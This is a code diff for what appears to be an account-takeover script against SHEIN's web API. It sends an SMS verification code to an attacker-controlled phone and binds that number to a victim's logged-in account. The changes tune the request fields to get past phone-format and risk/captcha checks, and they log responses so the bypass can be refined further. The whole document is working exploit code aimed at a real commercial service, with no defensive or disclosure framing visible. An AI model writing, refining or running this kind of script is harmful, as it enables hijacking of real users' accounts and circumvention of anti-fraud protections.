@@ -64,25 +64,35 @@
 
   if (STEP === 1) {
     // 2) send SMS code to the ATTACKER phone (code arrives on the attacker's device).
-    //    UK numbers: backend may want the national number with or without the leading 0.
-    //    Try the no-zero form first; if it returns a "wrong phone number" code, retry with the 0.
+    //    Body schema mirrors SHEIN's own UI: alias + phone_number BOTH set, + validate/bffVersionFlag.
+    //    (Adding phone_number moved the unauth probe past the phone-format check to a session/risk gate.)
+    //    Diagnostic: logs the FULL response so we learn if 10124005 (risk/captcha) clears once logged in.
     var forms = [ATTACKER_PHONE, "0"+ATTACKER_PHONE];
     var sent = false;
     for (var fi = 0; fi < forms.length && !sent; fi++) {
       var smsBody = form({
-        alias: forms[fi], area_code: ATTACKER_AREA, area_abbr: ATTACKER_ABBR,
-        alias_type: 2, scene: "bind_phone", daId: "", blackbox: ""
+        alias: forms[fi], phone_number: forms[fi],
+        area_code: ATTACKER_AREA, area_abbr: ATTACKER_ABBR,
+        alias_type: 2, scene: "bind_phone",
+        validate: 1, geetest_abnormal_mark: 0, bffVersionFlag: "true",
+        daId: "", blackbox: ""
       });
       try {
         var s = await fetch(BFF+"/user/account/send_sms_code?_ver=1.1.8&_lang=en",
           {method:"POST", credentials:"include", headers:H, body:smsBody});
         var txt = await s.text();
         log("SEND_SMS["+forms[fi]+"]", txt);
-        // code 0 / is_send => success; "10111012" = wrong number, try the other form
-        if (txt.indexOf('"10111012"') === -1) { sent = true; log("PHONE_FORMAT_OK", forms[fi]); }
+        // code:"0" or info.is_send => SENT. 10111012 = wrong number (try other form).
+        // 10124005 = risk/captcha or session gate (see if it clears when logged in).
+        if (txt.indexOf('"code":"0"') !== -1 || txt.indexOf('is_send') !== -1) {
+          sent = true; log("SMS_SENT_OK", forms[fi]);
+        } else if (txt.indexOf('"10111012"') === -1) {
+          // format accepted but a later gate hit — record which form passed format
+          log("PHONE_FORMAT_OK", forms[fi]);
+        }
       } catch(e){ log("SEND_SMS_ERR", String(e)); }
     }
-    log("NEXT", "read the code off your phone, set VICTIM_SMS_CODE = that code + STEP = 2, reload (use the PHONE_FORMAT_OK value)");
+    log("NEXT", "if SMS_SENT_OK: read the code, set VICTIM_SMS_CODE + PHONE_FORM + STEP=2, reload. If 10124005: paste me the response.");
   }
 
   if (STEP === 2) {
@@ -90,8 +100,10 @@
     //    Use the exact phone form that STEP 1 confirmed (PHONE_FORM); fall back to ATTACKER_PHONE.
     var bindPhone = PHONE_FORM || ATTACKER_PHONE;
     var bindBody = form({
-      phone: bindPhone, area_code: ATTACKER_AREA, area_abbr: ATTACKER_ABBR,
-      verification_code: VICTIM_SMS_CODE, scene: "bind_phone", blackbox: ""
+      phone: bindPhone, phone_number: bindPhone, alias: bindPhone,
+      area_code: ATTACKER_AREA, area_abbr: ATTACKER_ABBR, alias_type: 2,
+      verification_code: VICTIM_SMS_CODE, scene: "bind_phone",
+      validate: 1, bffVersionFlag: "true", blackbox: ""
     });
     try {
       var b = await fetch(BFF+"/user/account/bind_phone?_ver=1.1.8&_lang=en",
